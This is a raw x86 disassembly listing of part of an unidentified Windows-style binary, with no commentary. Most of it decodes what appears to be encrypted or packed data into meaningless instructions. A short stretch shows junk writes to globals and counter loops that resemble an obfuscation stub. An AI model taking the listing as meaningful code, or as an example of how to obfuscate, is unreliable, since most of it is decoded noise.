  40d22e:	std    
  40d22f:	scas   al,BYTE PTR es:[edi]
  40d230:	and    DWORD PTR [eax-0x1b3d9737],esi
  40d236:	xchg   ebp,eax
  40d237:	push   esi
  40d238:	and    eax,0xc8027794
  40d23d:	sahf   
  40d23e:	jbe    0x40d2a7
  40d240:	loopne 0x40d277
  40d242:	rcr    esi,1
  40d244:	pop    ebx
  40d245:	pop    es
  40d246:	jp     0x40d23d
  40d248:	and    eax,0x5ab3cad2
  40d24d:	adc    eax,0x8cd662b4
  40d252:	sbb    ch,BYTE PTR [edx+0x1d128051]
  40d258:	xchg   DWORD PTR [ecx],ebp
  40d25a:	popf   
  40d25b:	es pop esi
  40d25d:	jno    0x40d2c7
  40d25f:	mov    eax,ds:0x1b0e0c15
  40d264:	sbb    BYTE PTR [ebx],dh
  40d266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d267:	dec    eax
  40d268:	xor    dl,bh
  40d26a:	dec    edi
  40d26b:	inc    ecx
  40d26c:	xchg   ebp,eax
  40d26d:	sub    cl,BYTE PTR ds:0xba9dcfdc
  40d273:	dec    esp
  40d274:	dec    eax
  40d275:	jnp    0x40d293
  40d277:	adc    DWORD PTR [ecx],edi
  40d279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d27a:	and    eax,esi
  40d27c:	push   ss
  40d27d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d27e:	(bad)  
  40d27f:	std    
  40d280:	into   
  40d281:	cwde   
  40d282:	xor    DWORD PTR [esi+0x29],esp
  40d285:	mov    dh,0x74
  40d287:	out    dx,eax
  40d288:	(bad)  
  40d289:	js     0x40d285
  40d28b:	cs mov esp,0x138e6817
  40d291:	int    0x81
  40d293:	dec    edx
  40d294:	sahf   
  40d295:	sub    al,0xd9
  40d297:	ja     0x40d2ba
  40d299:	and    edx,DWORD PTR [edx]
  40d29b:	jns    0x40d29c
  40d29d:	in     al,dx
  40d29e:	ret    
  40d29f:	cmp    edx,DWORD PTR [edi+esi*4]
  40d2a2:	pextrw eax,(bad),0xc5
  40d2a4:	add    ah,BYTE PTR [ebx+ebp*8-0xf3b54c3]
  40d2ab:	xchg   BYTE PTR [ebp+0x28],al
  40d2ae:	xor    BYTE PTR [edi-0x4a845514],ch
  40d2b4:	arpl   di,bx
  40d2b6:	push   eax
  40d2b7:	or     eax,0x86dd13a5
  40d2bc:	mov    al,ds:0xcb5f6df5
  40d2c1:	out    0xfd,eax
  40d2c3:	(bad)  
  40d2c4:	xchg   esi,eax
  40d2c5:	pop    ebp
  40d2c6:	imul   ebp,DWORD PTR [edi+0x6d97c05],0xad86fe6
  40d2d0:	ins    BYTE PTR es:[edi],dx
  40d2d1:	test   BYTE PTR [ebp-0x55e85b8e],ah
  40d2d7:	jle    0x40d2f1
  40d2d9:	lods   al,BYTE PTR ds:[esi]
  40d2da:	(bad)  
  40d2db:	scas   al,BYTE PTR es:[edi]
  40d2dc:	out    0x5a,al
  40d2de:	mov    WORD PTR [esi+0x430d4c44],es
  40d2e4:	push   edx
  40d2e5:	cdq    
  40d2e6:	jmp    0xa967:0x6f4b84f
  40d2ed:	adc    BYTE PTR [eax+0x6a663e22],bl
  40d2f3:	or     esp,ebp
  40d2f5:	jp     0x40d2df
  40d2f7:	mov    ch,0x40
  40d2f9:	fst    QWORD PTR [ecx-0x19]
  40d2fc:	call   0x2734:0x945a2e56
  40d303:	mov    edx,0x5fa1d366
  40d308:	ret    
  40d309:	rol    DWORD PTR [esi-0x2de0659f],0x38
  40d310:	aaa    
  40d311:	dec    ecx
  40d312:	pop    esi
  40d313:	test   eax,0x17585e30
  40d318:	adc    edi,DWORD PTR [edi+0x35f772f1]
  40d31e:	jl     0x40d2db
  40d320:	fist   DWORD PTR [eax+0x33]
  40d323:	fisttp DWORD PTR [ebx+0x5ee94ad4]
  40d329:	add    al,BYTE PTR [eax]
  40d32b:	add    BYTE PTR [ebx-0x4cd54cfa],bl
  40d331:	stos   DWORD PTR es:[edi],eax
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	ins    DWORD PTR es:[edi],dx
  40d339:	bound  eax,QWORD PTR [ebp+edx*8-0x50]
  40d33d:	xchg   edi,eax
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	mov    esi,0xa6d60c27
  40d349:	ret    0xeb03
  40d34c:	or     bh,BYTE PTR [ebp-0x70]
  40d34f:	pop    es
  40d350:	rcl    BYTE PTR [ecx+0x3f843bac],0x20
  40d357:	mov    eax,0x8b96676
  40d35c:	cmp    al,0x6a
  40d35e:	xchg   esp,eax
  40d35f:	or     al,0x9a
  40d361:	cld    
  40d362:	jb     0x40d3e3
  40d364:	es in  al,0x79
  40d367:	pop    esi
  40d368:	out    dx,al
  40d369:	xchg   ebx,eax
  40d36a:	out    dx,al
  40d36b:	mov    al,ds:0x35c86512
  40d370:	add    edi,ecx
  40d372:	pop    edx
  40d373:	mov    eax,ds:0x59829845
  40d378:	xchg   ecx,eax
  40d379:	lods   eax,DWORD PTR ds:[esi]
  40d37a:	mov    dh,0x82
  40d37c:	dec    ecx
  40d37d:	dec    ebp
  40d37e:	xchg   BYTE PTR [ebx+0xe],ah
  40d381:	pop    ss
  40d382:	inc    ebp
  40d383:	call   0x37ccbc26
  40d388:	fadd   DWORD PTR [edi-0x50]
  40d38b:	push   edi
  40d38c:	pusha  
  40d38d:	addr16 (bad) 
  40d38f:	adc    DWORD PTR [eax],ebp
  40d391:	pop    edi
  40d392:	push   ebp
  40d393:	mov    ecx,0xcfbaa1fb
  40d398:	lea    edx,[ecx-0x6d]
  40d39b:	xor    ecx,DWORD PTR [eax-0x7]
  40d39e:	(bad)  
  40d3a0:	sub    DWORD PTR [ebx],ecx
  40d3a2:	fidiv  WORD PTR [esi-0x1e9bccb]
  40d3a8:	outs   dx,BYTE PTR ds:[esi]
  40d3a9:	jbe    0x40d32c
  40d3ab:	leave  
  40d3ac:	into   
  40d3ad:	scas   eax,DWORD PTR es:[edi]
  40d3ae:	ficom  WORD PTR [ecx]
  40d3b0:	fisttp QWORD PTR [ecx-0x15]
  40d3b3:	daa    
  40d3b4:	icebp  
  40d3b5:	or     DWORD PTR cs:[ebx+0x32],edx
  40d3b9:	(bad)  
  40d3bb:	(bad)  
  40d3bc:	mul    DWORD PTR [edx]
  40d3be:	scas   eax,DWORD PTR es:[edi]
  40d3bf:	push   ecx
  40d3c0:	or     BYTE PTR [ebp-0x21],dl
  40d3c3:	push   esi
  40d3c4:	mov    bl,BYTE PTR [esp+edi*4]
  40d3c7:	retf   
  40d3c8:	mov    DWORD PTR ds:[ecx+0x23d48357],0x8e43d5e7
  40d3d3:	cmp    al,0x95
  40d3d5:	out    dx,eax
  40d3d6:	mov    edi,0x68d421a6
  40d3db:	add    eax,DWORD PTR [esi]
  40d3dd:	retf   0xbf04
  40d3e0:	dec    edx
  40d3e1:	scas   eax,DWORD PTR es:[edi]
  40d3e2:	and    edi,DWORD PTR [ebp+0x5]
  40d3e5:	stc    
  40d3e6:	into   
  40d3e7:	cmp    ch,bh
  40d3e9:	mov    ds:0xfcc94fb,eax
  40d3ee:	imul   edx,ebx,0x1ca02c30
  40d3f4:	add    edi,edi
  40d3f6:	mov    ebp,0x94b428cd
  40d3fb:	fst    st(0)
  40d3fd:	popa   
  40d3fe:	or     dh,ch
  40d400:	dec    ebx
  40d401:	pop    esp
  40d402:	xchg   BYTE PTR [edx+0x3d],ah
  40d405:	shl    BYTE PTR [ebx],1
  40d407:	adc    al,0x39
  40d409:	cmp    BYTE PTR [esi-0x20992197],0x85
  40d410:	scas   eax,DWORD PTR es:[edi]
  40d411:	outs   dx,DWORD PTR ds:[esi]
  40d412:	cli    
  40d413:	out    0x98,al
  40d415:	repnz pop ecx
  40d417:	adc    eax,0x795e630f
  40d41c:	fisubr WORD PTR [esi+0x1ee3750e]
  40d422:	data16 lods al,BYTE PTR ds:[esi]
  40d424:	lock xchg esp,eax
  40d426:	jno    0x40d449
  40d428:	sub    bl,ch
  40d42a:	push   cs
  40d42b:	in     al,dx
  40d42c:	mov    edx,0x6784a1f6
  40d431:	inc    ebx
  40d432:	dec    ebx
  40d433:	add    DWORD PTR [ecx-0xd],esi
  40d436:	xchg   ebp,eax
  40d437:	or     eax,0x5af6a310
  40d43c:	jp     0x40d3f9
  40d43e:	pop    esi
  40d43f:	(bad)  
  40d440:	loop   0x40d405
  40d442:	in     eax,dx
  40d443:	pop    ecx
  40d444:	(bad)  
  40d446:	xor    al,0x7e
  40d448:	pop    ecx
  40d449:	loopne 0x40d3f3
  40d44b:	sbb    al,0x5c
  40d44d:	push   ss
  40d44e:	and    DWORD PTR [edi-0x4a182749],edx
  40d454:	and    ch,ah
  40d456:	xor    al,0x89
  40d458:	test   DWORD PTR [eax+0x413e851d],edi
  40d45e:	out    dx,eax
  40d45f:	push   ecx
  40d460:	pop    edi
  40d461:	ss sbb eax,0xbacc356
  40d467:	inc    edx
  40d468:	enter  0x24fb,0x41
  40d46c:	stc    
  40d46d:	addr16 pop edi
  40d46f:	mov    edx,0x7b684796
  40d474:	loopne 0x40d44c
  40d476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d477:	daa    
  40d478:	ror    BYTE PTR [edx],1
  40d47a:	scas   eax,DWORD PTR es:[edi]
  40d47b:	sti    
  40d47c:	sub    eax,0xa845b57c
  40d481:	inc    eax
  40d482:	mov    ah,0x65
  40d484:	stos   DWORD PTR es:[edi],eax
  40d485:	adc    DWORD PTR [eax],edx
  40d487:	daa    
  40d488:	cmp    edi,DWORD PTR [esi-0x77]
  40d48b:	jo     0x40d441
  40d48d:	dec    ebx
  40d48e:	xchg   esi,eax
  40d48f:	das    
  40d490:	jne    0x40d476
  40d492:	pop    gs
  40d494:	stc    
  40d495:	push   es
  40d496:	test   ebx,esi
  40d498:	jbe    0x40d4d8
  40d49a:	jl     0x40d47d
  40d49c:	leave  
  40d49d:	mov    BYTE PTR [ebp+0x39],cl
  40d4a0:	out    0x1a,eax
  40d4a2:	scas   eax,DWORD PTR es:[edi]
  40d4a3:	xor    ebp,DWORD PTR [edx]
  40d4a5:	mov    eax,ds:0xc18d755d
  40d4aa:	dec    edx
  40d4ab:	push   ds
  40d4ac:	(bad)  
  40d4ad:	shl    BYTE PTR [edi],cl
  40d4af:	sbb    al,0xe2
  40d4b1:	ret    
  40d4b2:	aaa    
  40d4b3:	xor    DWORD PTR [edi+0x4],ebp
  40d4b6:	jb     0x40d48c
  40d4b8:	dec    eax
  40d4b9:	and    bl,BYTE PTR [ecx]
  40d4bb:	psubq  mm3,mm2
  40d4be:	xor    bl,dl
  40d4c0:	je     0x40d4c3
  40d4c2:	inc    edi
  40d4c3:	xchg   ecx,eax
  40d4c4:	call   0x198d:0x561327ac
  40d4cb:	dec    edi
  40d4cc:	inc    ebx
  40d4cd:	(bad)  
  40d4ce:	(bad)  
  40d4cf:	in     al,0x27
  40d4d1:	popf   
  40d4d2:	mov    al,0xbd
  40d4d4:	cmp    eax,0x2c2e96bb
  40d4d9:	leave  
  40d4da:	xor    al,0xf3
  40d4dc:	loopne 0x40d4c9
  40d4de:	(bad)  
  40d4df:	out    dx,al
  40d4e0:	jl     0x40d51f
  40d4e2:	mov    bl,0xc
  40d4e4:	(bad)  
  40d4e5:	in     eax,0x28
  40d4e7:	lahf   
  40d4e8:	lock mov esp,0x7a4a9768
  40d4ee:	xchg   ebp,eax
  40d4ef:	jge    0x40d49c
  40d4f1:	dec    ecx
  40d4f2:	mov    ebx,0x2a01bf65
  40d4f7:	push   0x1c
  40d4f9:	test   BYTE PTR [ebp+0x64],al
  40d4fc:	out    dx,eax
  40d4fd:	mov    edx,0x7054dfde
  40d502:	enter  0xdd43,0x71
  40d506:	inc    ebx
  40d507:	push   0xffffffd5
  40d509:	pop    ebx
  40d50a:	push   0xc362cdd
  40d50f:	jl     0x40d53b
  40d511:	int3   
  40d512:	fisub  DWORD PTR [esi]
  40d514:	jae    0x40d4d7
  40d516:	ret    
  40d517:	add    bh,BYTE PTR [esi-0x46]
  40d51a:	pusha  
  40d51b:	sbb    esp,DWORD PTR [ecx-0x4]
  40d51e:	or     cl,dl
  40d520:	jo     0x40d58d
  40d522:	and    al,0x18
  40d524:	imul   ebp,DWORD PTR [eax+0x6c8c3749],0x48
  40d52b:	imul   ebp,ebx,0xffffffa5
  40d52e:	pop    es
  40d52f:	enter  0xe620,0xc0
  40d533:	leave  
  40d534:	out    dx,al
  40d535:	push   es
  40d536:	xchg   esi,eax
  40d537:	hlt    
  40d538:	xchg   edi,eax
  40d539:	pusha  
  40d53a:	mov    ch,0x63
  40d53c:	jns    0x40d559
  40d53e:	jge    0x40d4cf
  40d540:	xor    BYTE PTR [ecx+edi*1+0x228831d6],dh
  40d547:	add    BYTE PTR [esi+0x33a26bc1],0x83
  40d54e:	(bad)  
  40d54f:	ss xchg ebp,eax
  40d551:	jg     0x40d506
  40d553:	dec    edx
  40d554:	push   cs
  40d555:	test   eax,0xc5c1a817
  40d55a:	mov    eax,DWORD PTR [edx+ecx*4]
  40d55d:	out    dx,eax
  40d55e:	push   es
  40d55f:	add    al,0xf6
  40d561:	repnz rcl al,cl
  40d564:	popf   
  40d565:	in     eax,0x38
  40d567:	add    ebp,DWORD PTR [edi-0x523e0797]
  40d56d:	inc    ebp
  40d56e:	les    edi,FWORD PTR [eax+0x69285595]
  40d574:	jmp    0xbb36d5d1
  40d579:	mov    edi,edx
  40d57b:	int3   
  40d57c:	mov    ch,ch
  40d57e:	sbb    BYTE PTR [ecx-0x362c2a4a],0x4f
  40d585:	sub    esp,ecx
  40d587:	or     esi,DWORD PTR [edx+0x9]
  40d58a:	inc    ebx
  40d58b:	add    ebx,DWORD PTR [edx+ebx*1]
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x433823,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433817,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43381b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x433827,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x433863
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43381b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x4338a7,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x4338af,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x4337db,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x43385b,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433897,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433897
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433897,edx
  40d64f:	cmp    DWORD PTR ds:0x433897,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433897,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x4337e3,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x4337e3
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x4337e3,edx
  40d68b:	cmp    DWORD PTR ds:0x4337e3,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x4338d3
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x4337e3,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x4337e7
  40d6b7:	add    eax,DWORD PTR ds:0x43381b
  40d6bd:	mov    ds:0x4337e7,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0xb7a0482a
  40d6f9:	in     eax,0x51
  40d6fb:	pop    ss
  40d6fc:	jp     0x40d690
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d6e1
  40d705:	(bad)  
  40d706:	pop    ecx
  40d707:	cmp    DWORD PTR [edi-0x56],esi
  40d70a:	bts    DWORD PTR ds:0x5005b053,0x28
  40d712:	pop    edi
  40d713:	and    eax,0xeaf13d29
  40d718:	in     al,0xf8
  40d71a:	add    eax,0x32763549
  40d71f:	xchg   DWORD PTR [esi-0x36],eax
  40d722:	adc    esi,edi
  40d724:	jl     0x40d754
  40d726:	imul   esi,DWORD PTR [edx],0x404bd4ba
  40d72c:	imul   esp,ebx,0xffffffb8
  40d72f:	cli    
  40d730:	or     bh,bl
  40d732:	mov    ch,BYTE PTR [ebx]
  40d734:	cmp    al,0xd7
  40d736:	aaa    
  40d737:	jmp    0xef2b:0xab930c84
  40d73e:	xchg   BYTE PTR [ebx+ebx*2],dh
  40d741:	jg     0x40d79f
  40d743:	bnd ret 0x83ee
  40d747:	mov    al,0xcb
  40d749:	shl    dl,1
  40d74b:	pop    ds
  40d74c:	mov    ebx,DWORD PTR [esi+0x46e41534]
  40d752:	cmp    eax,0xcaa2fdcb
  40d757:	fidivr WORD PTR [ecx]
  40d759:	cwde   
  40d75a:	ret    
  40d75b:	pushf  
  40d75c:	push   es
  40d75d:	stos   BYTE PTR es:[edi],al
  40d75e:	ja     0x40d750
  40d760:	ret    
  40d761:	sub    ebx,ecx
  40d763:	push   ebp
  40d764:	std    
  40d765:	push   esi
  40d766:	(bad)
  40d76a:	repnz cmp dl,BYTE PTR [edi]
  40d76d:	imul   esp,DWORD PTR cs:[ebx],0xffffffaf
  40d771:	jmp    0x40d721
  40d773:	test   DWORD PTR [edi+0x30],ecx
  40d776:	or     eax,0x42eda1c7
  40d77b:	jne    0x40d774
  40d77d:	push   ebp
  40d77e:	push   cs
  40d77f:	into   
  40d780:	fst    DWORD PTR [eax+0xa5952a6]
  40d786:	(bad)  
  40d787:	fst    DWORD PTR [esi]
  40d789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d78a:	lahf   
  40d78b:	scas   al,BYTE PTR es:[edi]
  40d78c:	adc    BYTE PTR [ebx+eax*8+0x5ec18d2f],0x55
  40d794:	lahf   
  40d795:	jl     0x40d7e3
  40d797:	jp     0x40d79b
  40d799:	inc    edx
  40d79a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d79b:	xchg   esi,eax
  40d79c:	pushf  
  40d79d:	dec    edx
  40d79e:	push   esi
  40d79f:	(bad)  
  40d7a1:	imul   ebx,DWORD PTR [edi+0x7a6ef07a],0xffffffe2
  40d7a8:	mov    ecx,0x4d106a5c
  40d7ad:	adc    BYTE PTR ds:0x99896be0,dh
  40d7b3:	xor    eax,ecx
  40d7b5:	pop    esp
  40d7b6:	inc    esp
  40d7b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7b8:	push   eax
  40d7b9:	(bad)  
  40d7bb:	out    dx,eax
  40d7bc:	sub    al,0x12
  40d7be:	sbb    ecx,DWORD PTR [ebp-0x60da2806]
  40d7c4:	rdpmc  
  40d7c6:	fdivr  DWORD PTR [ebp+0x51]
  40d7c9:	mov    ds:0x6777a57b,al
  40d7ce:	mov    ds:0x380a98b9,al
  40d7d3:	xchg   esi,eax
  40d7d4:	and    al,0xea
  40d7d6:	jnp    0x40d804
  40d7d8:	loope  0x40d7cc
  40d7da:	mov    eax,0xff940a1e
  40d7df:	jecxz  0x40d817
  40d7e1:	and    DWORD PTR [esp+eax*2+0x65],ebp
  40d7e5:	(bad)  
  40d7e7:	lea    ebp,[ebp+0x32]
  40d7ea:	push   ecx
  40d7eb:	and    esi,0xffffff9e
  40d7ee:	pop    gs
  40d7f0:	test   ecx,ebx
  40d7f2:	stos   BYTE PTR es:[edi],al
  40d7f3:	mov    ch,0xc0
  40d7f5:	jbe    0x40d851
  40d7f7:	int3   
  40d7f8:	repz inc ebp
  40d7fa:	(bad)  
  40d7fb:	std    
  40d7fc:	jge    0x40d77e
  40d7fe:	shr    BYTE PTR [ebx-0x2111ea0c],0xbf
  40d805:	ja     0x40d84e
  40d807:	add    BYTE PTR [ebx],0xf0
  40d80a:	cmc    
  40d80b:	stc    
  40d80c:	mov    DWORD PTR [eax+0x72e769ee],esi
  40d812:	push   0xa
  40d814:	push   edi
  40d815:	dec    DWORD PTR [ebp+0x69]
  40d818:	pusha  
  40d819:	add    al,cl
  40d81b:	pop    ebx
  40d81c:	sbb    ebp,ecx
  40d81e:	stc    
  40d81f:	adc    esp,DWORD PTR [ebx-0x1571b2f7]
  40d825:	push   edi
  40d826:	sbb    DWORD PTR [edi+0x15],esi
  40d829:	mov    dl,0x84
  40d82b:	repnz in eax,dx
  40d82d:	scas   eax,DWORD PTR es:[edi]
  40d82e:	xchg   ebx,eax
  40d82f:	jmp    0xd2f7e54
  40d834:	mov    fs,ecx
  40d836:	xchg   edx,eax
  40d837:	sbb    edx,ebp
  40d839:	(bad)  
  40d83a:	mov    ecx,0xc95391a
  40d83f:	mov    ecx,0x51d464fb
  40d844:	xor    al,0x13
  40d846:	or     al,0xa
  40d848:	lahf   
  40d849:	mov    bh,BYTE PTR [ecx+0x31a5580e]
  40d84f:	inc    esi
  40d850:	sbb    edx,DWORD PTR [ecx-0x7c]
  40d853:	push   edx
  40d854:	out    dx,eax
  40d855:	lahf   
  40d856:	inc    edi
  40d857:	inc    ebp
  40d858:	pop    esi
  40d859:	aam    0xdc
  40d85b:	out    0x92,al
  40d85d:	stos   BYTE PTR es:[edi],al
  40d85e:	cmp    al,0xf3
  40d860:	nop
  40d861:	xor    ebp,DWORD PTR [ecx-0x6c6a8608]
  40d867:	and    eax,0x5266746d
  40d86c:	fsub   DWORD PTR [eax+ebp*1]
  40d86f:	enter  0xbcd7,0x6d
  40d873:	loope  0x40d89e
  40d875:	sti    
  40d876:	lods   eax,DWORD PTR ds:[si]
  40d878:	xor    eax,0x2a9edaef
  40d87d:	ja     0x40d81c
  40d87f:	es ss addr16 fwait
  40d883:	mov    ds:0xf3985990,al
  40d888:	pop    ss
  40d889:	xor    BYTE PTR [ebx-0x33],dl
  40d88c:	enter  0x8cbb,0x15
  40d890:	stos   DWORD PTR es:[edi],eax
  40d891:	xchg   esp,eax
  40d892:	jb     0x40d86e
  40d894:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d895:	pop    ebp
  40d896:	out    dx,al
  40d897:	test   al,0x2b
  40d899:	out    0x11,eax
  40d89b:	leave  
  40d89c:	repz repz and bh,BYTE PTR [ebx]
  40d8a0:	jbe    0x40d864
  40d8a2:	jl     0x40d8e7
  40d8a4:	push   ss
  40d8a5:	lahf   
  40d8a6:	mov    ds:0x3ebda3b0,eax
  40d8ab:	dec    esi
  40d8ac:	jae    0x40d92d
  40d8ae:	lock hlt 
  40d8b0:	dec    edx
  40d8b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8b3:	lods   eax,DWORD PTR ds:[esi]
  40d8b4:	loopne 0x40d864
  40d8b6:	into   
  40d8b7:	mov    ebp,0xec131fc1
  40d8bc:	sti    
  40d8bd:	fnstcw WORD PTR [ebx+0x2e373f33]
  40d8c3:	lock xchg esi,eax
  40d8c5:	push   ss
  40d8c6:	pop    ebp
  40d8c7:	daa    
  40d8c8:	pop    edi
  40d8c9:	les    edi,FWORD PTR [edx]
  40d8cb:	out    dx,al
  40d8cc:	xchg   esi,eax
  40d8cd:	mov    dh,0xe1
  40d8cf:	sub    DWORD PTR [esp+eax*2-0x7a773097],0x8fe05f8b
  40d8da:	sbb    ch,BYTE PTR [eax+0x73945c60]
  40d8e0:	cmp    ecx,DWORD PTR ds:0x6b310f3
  40d8e6:	mov    ebx,0xfe8775a5
  40d8eb:	jecxz  0x40d88c
  40d8ed:	or     bl,ch
  40d8ef:	xlat   BYTE PTR ds:[ebx]
  40d8f0:	data16 mov al,0x42
  40d8f3:	inc    ebx
  40d8f4:	add    bh,dl
  40d8f6:	jl     0x40d905
  40d8f8:	adc    ebx,esi
  40d8fa:	inc    esp
  40d8fb:	scas   eax,DWORD PTR es:[edi]
  40d8fc:	jo     0x40d90d
  40d8fe:	push   esp
  40d8ff:	xor    BYTE PTR [ebp-0x4c],dh
  40d902:	jnp    0x40d89a
  40d904:	xor    ebp,DWORD PTR [edi]
  40d906:	rol    DWORD PTR [ecx-0x45398bc5],0xb9
  40d90d:	mov    al,0xe5
  40d90f:	test   DWORD PTR [ebp-0x47],eax
  40d912:	xchg   ebp,eax
  40d913:	sub    dh,cl
  40d915:	or     dl,BYTE PTR [esp+ecx*2+0x71]
  40d919:	in     al,dx
  40d91a:	in     eax,0x93
  40d91c:	push   ebp
  40d91d:	or     dl,BYTE PTR [esi+0x4df75ed7]
  40d923:	add    bl,dh
  40d925:	push   esp
  40d926:	sub    DWORD PTR [ebp+0x24],eax
  40d929:	scas   eax,DWORD PTR es:[edi]
  40d92a:	(bad)  [ecx+0x75]
  40d92d:	jle    0x40d9ae
  40d92f:	mov    al,ds:0x4e94f78d
  40d934:	out    0xaa,eax
  40d936:	mov    al,ds:0xec7b5ca7
  40d93b:	add    DWORD PTR [edx+0xf5848ea],0x89ad470d
  40d945:	add    DWORD PTR [ebx-0xd1607bb],ecx
  40d94b:	add    al,0x0
  40d94d:	add    BYTE PTR [ebx+0x4d8bfc45],cl
  40d953:	adc    BYTE PTR [ebx],dh
  40d955:	mov    DWORD PTR [ebx],0x258e9c6
  40d95b:	add    BYTE PTR [eax],al
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x402b51ed
  40d96a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d96b:	iret   
  40d96c:	(bad)  
  40d96f:	jle    0x40d9ef
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d908
  40d976:	xor    dl,bh
  40d978:	mov    ds:0xc99010b2,eax
  40d97d:	shl    BYTE PTR ds:0xd38e82f1,1
  40d983:	or     bl,BYTE PTR [esi]
  40d985:	in     eax,0x1e
  40d987:	xor    edi,esi
  40d989:	pop    ecx
  40d98a:	fisubr DWORD PTR [eax+0x66]
  40d98d:	lea    ebx,[ebp-0x2d91285d]
  40d993:	ret    
  40d994:	enter  0x3740,0x6
  40d998:	ds mov esp,esi
  40d99b:	xor    al,0x5
  40d99d:	adc    al,0xc5
  40d99f:	push   esi
  40d9a0:	push   ebp
  40d9a1:	pushf  
  40d9a2:	bound  ebp,QWORD PTR [eax]
  40d9a4:	stos   DWORD PTR es:[edi],eax
  40d9a5:	and    eax,0xee34147d
  40d9aa:	aaa    
  40d9ab:	xor    dh,BYTE PTR [ecx+0x51726b7e]
  40d9b1:	xor    al,0x2b
  40d9b3:	(bad)  
  40d9b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9b5:	push   esp
  40d9b6:	call   0xccffc910
  40d9bb:	in     eax,dx
  40d9bc:	jae    0x40d9e2
  40d9be:	add    eax,0xf72abb4d
  40d9c3:	retf   0x2ecc
  40d9c6:	test   DWORD PTR [ebp-0x1fe4a17b],esi
  40d9cc:	test   DWORD PTR [ebx+0x4e],eax
  40d9cf:	test   BYTE PTR [edx+0x6d],bh
  40d9d2:	jp     0x40da0e
  40d9d4:	cmp    BYTE PTR [ebp+0x296c9fba],ch
  40d9da:	or     BYTE PTR [ebp-0x7d582d80],bh
  40d9e0:	jecxz  0x40da29
  40d9e2:	cmp    esp,ecx
  40d9e4:	sub    esi,DWORD PTR [esi]
  40d9e6:	jno    0x40da45
  40d9e8:	loope  0x40da0c
  40d9ea:	inc    ecx
  40d9eb:	adc    DWORD PTR [edx-0x33],edi
  40d9ee:	adc    bl,dl
  40d9f0:	mov    cl,0x86
  40d9f2:	mov    eax,0x86e73605
  40d9f7:	sub    cl,BYTE PTR [edi]
  40d9f9:	popf   
  40d9fa:	inc    ecx
  40d9fb:	mov    edx,0xe1ebaed6
  40da00:	retf   0x3f33
  40da03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da05:	ret    
  40da06:	cld    
